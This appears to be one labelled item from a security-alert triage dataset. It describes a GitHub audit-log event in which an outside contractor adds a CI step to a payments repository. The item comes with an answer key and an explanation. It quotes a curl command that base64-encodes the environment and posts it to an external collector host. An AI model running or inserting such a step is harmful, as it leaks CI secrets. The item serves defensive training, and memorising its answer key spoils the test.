- id: y51
  d: cloud
  src: 'GitHub · Audit log'
  t: 'Workflow file changed'
  h: 'repo: corp/payments-core'
  l: ['action: git.push to branch tmp-fix-ci by contractor-dev (outside collaborator, 4 days)', 'diff to .github/workflows/ci.yml: new step curl -s -d "$(env | base64)" https://hooks-collector[.]site/x', 'workflow trigger is pull_request_target, so secrets are available to code from the branch', 'no CODEOWNERS review; the run started 40 s after the push']
  v: 1
  x: T1552.001
  c: gha-workflow-change
  k: [1, 2]
  diff: 3
  say: 'An outside collaborator pushed a workflow change posting the environment to an external URL, on a secrets-exposing trigger, without code owner review.'
  tell: 'env piped to curl in a CI step is a secrets exfiltration line, and pull_request_target hands secrets to code from a branch or fork. Outside collaborator four days old, no CODEOWNERS review, run 40 seconds after the push. Rotate every secret that workflow could read.'
